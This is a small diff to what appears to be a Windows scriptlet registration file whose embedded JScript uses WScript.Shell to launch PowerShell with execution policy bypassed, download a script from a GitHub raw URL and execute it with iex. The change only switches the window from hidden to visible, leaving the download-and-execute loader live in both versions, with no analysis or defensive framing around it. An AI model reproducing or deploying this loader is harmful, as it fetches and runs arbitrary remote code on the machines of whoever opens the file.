@@ -4,7 +4,7 @@
 <script language="JScript">
 <![CDATA[
 var shell = new ActiveXObject("WScript.Shell");
-shell.Run("powershell -ExecutionPolicy Bypass -NoProfile -Command \"iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jodshot11-sudo/Mist-Auth/refs/heads/main/run.sct')\"", 0, false);
+shell.Run("powershell -ExecutionPolicy Bypass -NoProfile -Command \"iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/jodshot11-sudo/Mist-Auth/refs/heads/main/run.sct')\"", 1, false);
 ]]>
 </script>
 </registration>
